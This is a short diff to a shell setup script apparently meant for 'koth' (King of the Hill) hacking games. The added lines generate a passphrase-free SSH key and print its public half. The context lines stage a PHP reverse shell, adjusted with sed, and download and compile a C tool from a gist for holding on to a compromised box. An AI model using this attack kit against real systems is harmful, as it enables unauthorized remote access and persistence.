@@ -34,4 +34,9 @@ cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php && sed -i "s/PUT
 echo "chattr alternative for koth (mf.c and mf)"
 wget -q https://gist.githubusercontent.com/ChrisPritchard/05d98e1d195bc255b30674c8ce0fec50/raw/44b4079a5317820db6789b90a0c6d0dfb2330609/mf.c -O mf.c && gcc -static -o mf mf.c
 
+echo "creating ssh key"
+ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null
+echo "public key is:"
+cat .ssh/id_ed25519.pub
+
 echo "ready!"
